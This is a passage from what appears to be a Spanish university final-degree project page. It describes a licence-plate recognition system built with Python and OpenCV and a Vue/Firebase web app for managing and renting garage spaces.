software dereconocimiento de las mismas y por los datos ingresados por los usuarios en la aplicación web.ObjetivosEn este TFG se plantean dos objetivos. Aunque ambos se consideren sistemas independientes ydeban funcionar auto suficientemente, deben compartir información para lograr dotar de inteligencia yautomatización a la red de garajes.El primero de ellos es el desarrollo de un programa en Python para el reconocimiento de matrículasde vehículos. Partiendo desde una foto de un vehículo, se deberá obtener como salida sumatrícula, como se puede observar en la figura 1.1. Para ello es necesario realizar una serie de procedimientos: Acotar la región de interés, que en este caso es la matrícula. Segmentación de los caracteres extraídos de la zona de interés. Reconocimiento de caracteres.El propósito no solo será integrar un software que incorpore técnicas capaces de realizar dichospasos, sino también desarrollar métodos propios capaces de ello en base al estudio de técnicas yaexistentes. Para ambos propósitos, se hará uso de la librería de visión artificial OpenCV, que apartede incorporar procedimientos para el tratamiento y análisis de imágenes también posee técnicasavanzadas para los pasos citados anteriormente.Ejemplo de entrada y salida en el reconocimiento de matrículasEl segundo es el desarrollo de una aplicación web. El propósito es la creación de una red socialdonde los usuarios puedan gestionar tanto sus garajes como sus plazas. Se plantea que laaplicación sea sencilla de utilizar e intuitiva.Dentro de la red social existen dos roles: usuario administrador y usuario personal. Cada uno de ellosdispone de una interfaz distinta que les permite realizar acciones específicas en función de su rol.El usuario administrador representa una organización (comunidad de vecinos, trabajo, universidad,etc) la cual dispone de un garaje. Algunas de las vistas de la aplicación web relacionadas con el usuarioadministrador pueden verse en la figura 1.2. Se caracterizará por: Panel con el estado actual del garaje, es decir, plazas ocupadas y libres. Histórico de vehículos que han entrado y salido del garaje. tramitar altas y bajas de usuarios personales dentro de la organización. Editar la asignación de plazas de garajes a los usuarios personales.Ejemplo de interfaz para usuario administrador en la aplicación webEl usuario personal representa una persona física. Algunas de las vistas de la aplicación webrelacionadas con el usuario personal pueden verse en la figura 1.3. Se caracterizará por: Agregar, editar y borrar vehículos a su listado de vehículos. Con los cuales podrá acceder a los garajes. Solicitar acceso a una organización. Se podrá realizar por medio de un mapa interactivo o por búsqueda enuna lista de organizaciones. Poner en alquiler plazas en desuso para que otros usuarios personales puedan acceder a ellas. Alquilar plazas de garajes de otros usuarios personales.Ejemplo de interfaz para usuario personal en la aplación webDiseñoEn este apartado se exponen los aspectos más relevantes en cuanto al diseño del sistema. En laprimera sección se estudia la arquitectura que posee el sistema desde una perspectiva genérica. Enlas sucesivas secciones se trata en detalle cada una de las piezas que componen dicho sistema.Arquitectura del sistemaPartiendo de una descripción de alto nivel del sistema, determinamos que está conformado por trespiezas, tal y como podemos ver en la figura 4.1:Arquitectura del sistema Sistema de reconocimiento de matrículas: su tarea consiste en detectar la presencia de vehículos para realizarfotografías y comenzar con el análisis de las mismas. Pasados unos segundos y con la matrícula reconocida,se manda una petición a la base de datos para comprobar si dicha matrícula pertenece o no al garaje.Será necesario un miniordenador (ej. Raspberry Pi) en cada puerta de garaje. Aplicación web: desarrollada mediante el framework Vue. Esta pieza es la que permite a los usuarios administradoresy personales gestionar las labores asociadas con los garajes.Durante la fase de desarrollo, se levanta un pequeño servidor en local que alojara la aplicación web. Una vezconcluido el desarrollo, se opta por hacer la aplicación web accesible por medio del servicio de hosting queproporciona firebase. Base de datos: dispone de dos puntos de acceso. El primero es usado por el sistema de reconocimiento de matrículas para consultar las matrículas analizadas. El segundo, usado por la aplicación web para el almacenamientode todos los datos necesarios para el funcionamiento de la misma. Pieza alojada en el sistema de basesde datos de firebase que permite la sincronización de datos en tiempo real con una estructura NoSQL.Arquitectura del sistema de reconocimiento de matrículasPara crear un sistema capaz del reconocimiento de matrículas se ha hecho uso de la visión artificial.Siendo esta una disciplina científica derivada de la inteligencia artificial que incluye métodos parala adquisición, procesamiento, análisis y comprensión de imágenes. En definitiva, el propósito es eldiseño de sistemas informáticos capaces de extraer información de una imagen tomada del mundoreal.En concreto, para resolver el reconocimiento de matrículas, será necesario que el sistema utilicetécnicas de procesamiento de imágenes y de reconocimiento de patrones para extraer informaciónsobre la matrícula presente en la imagen. Para ello es necesario aplicar cuatro fases: Captura de la imagen: esta fase es sustituida por imágenes de vehículos extraídas de la base de datos. Localización de la matrícula: fase considerada como la más compleja de todo el proceso de reconocimientode la matrículas, pues entran en juego muchos objetos en la imagen que pueden ofuscar al sistema.Como se puede observar en la figura 4.2, la fase parte con la imagen realizada al vehículo. A continuación,por medio de técnicas de procesamiento de imágenes se trata de extraer información útil para ubicar y acotarla matrícula del resto de la imagen. Para ello, se utilizan técnicas que recurren a la detección de extremos,búsqueda de coincidencias, extracción de punto de interés, etc.Para realizar esta fase ha sido necesario el uso de la librería OpenCV, de la cual se han extraído técnicasde reconocimiento de objetos como: Haar Cascade5 , Speeded-Up Robust Features (SURF)6 y Histogram ofOriented Gradients (HOG)7 .Por otro lado, se implementa una técnica propia llamada SelfMethod basada en las nociones aprendidasdurante la implementación de las técnicas extraídas de OpenCV.Localización de la matrícula usando la técnica SelfMethod Segmentación de caracteres: tras haber acotado la matrícula, se segmenta cada uno de los caracterespresentes en la matrícula, tal y como se observa en la figura 4.3.Es considerada una fase crucial ya que un error durante la segmentación acarrea la incomprensión de la matrículaen la siguiente fase.A pesar de ello, la complejidad para llevar a cabo el proceso es mínima. Por esa razón, se decidió implementarun método propio denominado SelfMethod. Para lograr esto, se vuelven a utilizar técnicas de procesamiento deimágenes extraídas de la librería OpenCV.Otro aspecto a tener en cuenta durante esta fase es eliminar aquellos elementos indeseables de las matrículascomo: guiones, puntos, país de la matrícula, etc.Segmentación de cada carácter dde la matrícula Reconocimiento de caracteres: de la fase anterior se reciben tantas imágenes como caracteres haya enla matrícula. En cada una de las imágenes se ha de efectuar el mismo procedimiento. El primer paso es labinarización de la imagen, esto consiste en reducir la información presente de la imagen para normalizar elhistograma y atenuar el ruido.El siguiente paso consiste en la extracción de características para su comparación con los patrones decaracteres ya definidos en el motor OCR8 . De esta manera, el resultado será el carácter con el que mássimilitud tenga.Algunas de las problemáticas que pueden surgir en esta fase están relacionadas con la calidad de la imagen.Entre las dificultades se pueden encontrar: iluminación pobre, imágenes desenfocadas, técnicas de evasiónusadas por el propietario del vehículo, sombras, etc.La salida que se obtiene al finalizar esta fase es la matricula formada por la unión de cada uno de los caracteres,como se puede observar en la figura 4.4Para realizar esta fase se va a utilizar un motor OCR previamente entrenado como pytesseract y también sedesarrolla un motor OCR propio para comparar resultados.Clasificación individual de cada carácterArquitectura de la aplicación webSe ha escogido la arquitectura BaaS9 (Backend As A Service) como modelo para el desarrollo de la aplicación web. Esta arquitectura se basa en otorgar al desarrollador una serie de servicios que le permita prescindir de lacreación de una API personalizada.La tecnología escogida para la implementación de dicha arquitectura es Firebase. Los servicios quese han integrado en nuestra aplicación son: Base de datos en tiempo real: permite prescindir de tareas como el mantenimiento y la optimización de la misma. El único contra es que debes adaptarte al ecosistema que ofrece. Hosting: permite alojar la aplicación en sus servidores. Servicio de autenticación de usuarios: para el control de acceso, registro y gestión de los usuarios.En definitiva, la elección de la arquitectura se basa en el hecho de no tratar temas que no competen en el desarrollo de este TFG. De esta manera, liberamos al desarrollador de carga detrabajo en aspectos no trascendentales.Esto da lugar a que la mayor parte del desarrollo se centre en la creación de la interfaz de usuario.La tecnología escogida para llevar el desarrollo de la interfaz es el framework de Javascript denominado Vue. Usado para el desarrollo de páginas web siguiendo el patrón Modelo, Vista, Vista-Modelo(MVVM). La principal finalidad de este patrón es desacoplar lo máximo posible la interfaz de usuario de la lógica de la aplicación.Este patrón está compuesto por tres partes, tal y como se puede observar en la siguiente figura 4.5:Patrón MVVMResultados (videos)En esta sección se adjuntando vídeos con las funcionalidades que presenta el TFG.Sistema reconocimiento de matrículas. Localización de matrícula (click para ver el vídeo completo):funcionamiento del método propio desarrollado para la detección de matrículas. Segmentación matrícula (click para ver el vídeo completo): funcionamiento del método propio desarrollado para la segmentación de matrículas. Reconocimiento de caracteres (click para ver el vídeo completo): funcionamiento del método propio desarrollado para el reconocimiento de caracteres.Aplicación web. Registro de usuario persona (click para ver el vídeo completo): Añadir vehículo en cuenta de usuario personal (click para ver el vídeo completo): Añadiendo organizaciones a usuario personal (click para ver el vídeo completo): Alquilando garaje (click para ver el vídeo completo): Integración. Accediendo al garaje (click para ver el vídeo completo): Resultados (PDF)En esta sección se adjunta el PDF entregado como TFG.Reverse Footnote OpenCV [Accedido: Junio-2019] &amp;#8617; VueJS [Accedido: Junio-2019] &amp;#8617; Arquitectura SPA [Accedido: Junio-2019] &amp;#8617; Firebase [Accedido: Junio-2019] &amp;#8617; Haar Cascade [Accedido: Junio-2019] &amp;#8617; SURF [Accedido: Junio-2019] &amp;#8617; HOG [Accedido: Junio-2019] &amp;#8617; OCR [Accedido: Junio-2019] &amp;#8617; BaaS [Accedido: Junio-2019] &amp;#8617; " } ]
